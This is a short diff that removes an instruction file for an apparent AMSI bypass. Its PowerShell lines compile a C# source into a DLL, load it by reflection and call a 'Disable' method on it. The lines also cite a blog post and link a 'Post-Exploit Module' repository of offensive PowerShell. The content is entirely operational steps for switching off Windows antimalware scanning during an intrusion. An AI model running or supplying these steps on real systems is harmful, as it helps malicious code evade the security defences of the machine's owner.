@@ -1,8 +1,0 @@
-INSTRUCTION: 
-	-	Add-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\Source.cs")) -OutputAssembly "Source.dll"
-	- 	[Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\\Source.dll"))
-	-	[BP.AMS]::Disable()
-	
-	Ref: https://www.citadel.co.il/Home/Blog/1008
-	
-	Post-Exploit Module: https://github.com/aloksaurabh/OffenPowerSh
